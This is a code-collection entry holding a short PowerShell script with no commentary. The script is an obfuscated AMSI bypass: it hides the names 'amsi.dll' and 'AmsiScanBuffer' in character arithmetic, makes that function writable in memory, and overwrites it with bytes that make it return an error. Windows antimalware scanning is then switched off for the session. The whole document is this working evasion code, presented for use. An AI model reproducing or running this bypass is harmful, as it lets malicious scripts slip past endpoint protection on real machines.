---
id: d04968b8-b58b-40d8-9e71-f4107e50ef92
type: code
language: Powershell
verified: false
created_at: '2023-01-11T19:21:21.173751+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet d04968b8

**Language**: Powershell

```powershell
$ierku = @"
using System;
using System.Runtime.InteropServices;
public class ierku {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr cdzyrg, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ierku

$ibaoqco = [ierku]::LoadLibrary("$([CHAr]([BYTe]0x61)+[chAR](109*83/83)+[cHAR](115)+[cHaR]([BytE]0x69)+[cHaR]([bYte]0x2e)+[chaR]([ByTe]0x64)+[chAr]([bYTe]0x6c)+[cHaR]([byTE]0x6c))")
$ckdbww = [ierku]::GetProcAddress($ibaoqco, "$([Char](65*46/46)+[ChAr]([byte]0x6d)+[chAr](115+55-55)+[cHar](105+72-72)+[CHaR](11+72)+[cHar]([bYTE]0x63)+[cHaR](97+33-33)+[ChAr]([bYTE]0x6e)+[cHAR](66+45-45)+[chAr](95+22)+[CHAR]([BYte]0x66)+[cHar](102*43/43)+[ChAR]([BYTe]0x65)+[char](114*91/91))")
$p = 0
[ierku]::VirtualProtect($ckdbww, [uint32]5, 0x40, [ref]$p)
$itid = "0xB8"
$jjjd = "0x57"
$byjw = "0x00"
$qiai = "0x07"
$iprq = "0x80"
$mumw = "0xC3"
$bdfxh = [Byte[]] ($itid,$jjjd,$byjw,$qiai,+$iprq,+$mumw)
[System.Runtime.InteropServices.Marshal]::Copy($bdfxh, 0, $ckdbww, 6)
```


